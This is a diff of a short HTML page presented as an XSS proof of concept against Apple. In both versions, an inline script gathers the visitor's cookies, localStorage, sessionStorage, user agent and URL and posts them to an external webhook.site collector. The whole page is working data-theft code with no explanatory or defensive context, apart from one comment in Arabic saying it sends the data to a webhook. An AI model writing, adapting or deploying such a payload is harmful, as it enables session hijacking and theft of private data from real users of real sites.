@@ -1,31 +1,24 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
   <meta charset="UTF-8">
-  <title>Apple XSS Proof Page</title>
+  <title>PoC - Apple</title>
 </head>
 <body>
-  <h1 style="text-align:center;margin-top:20%">XSS Proof Page</h1>
-  
+  <h2>Collecting Data...</h2>
   <script>
-    // إرسال البيانات إلى Webhook
-    const webhookUrl = "https://webhook.site/bed70d88-4b8b-425d-85f8-7393fca9412b";
-    
-    const payload = {
-      cookie: document.cookie,
-      localStorage: localStorage,
-      sessionStorage: sessionStorage,
-      userAgent: navigator.userAgent,
-      url: location.href,
-      origin: location.origin,
-      referrer: document.referrer
-    };
-
-    fetch(webhookUrl, {
+    fetch("https://webhook.site/bed70d88-4b8b-425d-85f8-7393fca9412b", {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload),
-      mode: "no-cors"
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        cookie: document.cookie,
+        localStorage: JSON.stringify(localStorage),
+        sessionStorage: JSON.stringify(sessionStorage),
+        userAgent: navigator.userAgent,
+        url: window.location.href
+      })
     });
   </script>
 </body>
